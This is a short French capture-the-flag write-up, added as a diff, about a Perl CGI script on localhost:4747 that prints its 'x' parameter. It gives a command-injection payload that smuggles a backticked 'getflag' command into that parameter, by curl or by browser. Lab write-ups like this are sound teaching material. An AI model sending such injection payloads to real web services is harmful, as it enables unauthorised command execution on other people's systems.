@@ -1,0 +1,12 @@
+on peut voir dans le fichier perl, qu'il utilise les CGI et localhost:4747
+
+ensuite dans le script on peut voir qu'il attend une entrée x et qu'il va print sa valeur
+
+on peut curl ou directement aller sur le navigateur
+
+curl localhost:4747/?x=\`getflag\`
+
+ou directement dans un navigateur : 
+
+localhost:4747/?x=`getflag`
+
